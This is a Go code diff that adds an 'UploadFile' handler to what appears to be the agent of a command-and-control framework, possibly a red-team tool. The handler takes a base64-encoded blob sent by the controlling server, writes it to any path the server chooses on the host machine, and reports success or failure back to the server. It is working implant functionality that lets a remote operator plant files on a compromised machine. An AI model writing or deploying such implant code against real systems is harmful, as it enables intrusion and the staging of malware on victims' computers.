@@ -20,9 +20,11 @@ package main
 import (
 	"bytes"
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/json"
 	"flag"
 	"fmt"
+	"io/ioutil"
 	"math/rand"
 	"net"
 	"net/http"
@@ -285,6 +287,56 @@ func statusCheckIn(host string, client *http.Client) {
 			color.Green("%s Message Type Received!", j.Type)
 		}
 		switch j.Type { // TODO add self destruct that will find the .exe current path and start a new process to delete it after initial sleep
+		case "UploadFile":
+			var p messages.UploadFile
+			json.Unmarshal(payload, &p)
+			// Setup the message to submit the status of the upload
+			c := messages.CmdResults{
+				Job:    p.Job,
+				Stdout: "",
+				Stderr: "",
+			}
+			if verbose || debug {
+				color.Yellow("Writing blob to : %s", p.Dest)
+			}
+			d1, err := base64.StdEncoding.DecodeString(p.FileBlob)
+			if err != nil {
+				c.Stderr = err.Error()
+				if verbose || debug {
+					color.Red("[!]There was an error decoding the fileBlob")
+					color.Red(err.Error())
+				}
+			} else {
+				err = ioutil.WriteFile(p.Dest, d1, 0644)
+				if err != nil {
+					c.Stderr = err.Error()
+					if verbose || debug {
+						color.Red("[!]There was an error writing to : %s", p.Dest)
+						color.Red(err.Error())
+					}
+				} else {
+					c.Stdout = fmt.Sprintf("Successfully wrote to %s", p.Dest)
+				}
+
+			}
+			k, _ := json.Marshal(c)
+			g := messages.Base{
+				Version: 1.0,
+				ID:      j.ID,
+				Type:    "CmdResults",
+				Payload: (*json.RawMessage)(&k),
+				Padding: randStringBytesMaskImprSrc(paddingMax),
+			}
+			b2 := new(bytes.Buffer)
+			json.NewEncoder(b2).Encode(g)
+			if verbose {
+				color.Yellow("Sending response to server\n %s\n%s", c.Stdout, c.Stderr)
+			}
+			resp2, _ := client.Post(host, "application/json; charset=utf-8", b2)
+			if resp2.StatusCode != 200 {
+				color.Red("Message error from server. HTTP Status code: %d", resp2.StatusCode)
+			}
+
 		case "CmdPayload":
 			var p messages.CmdPayload
 			json.Unmarshal(payload, &p)
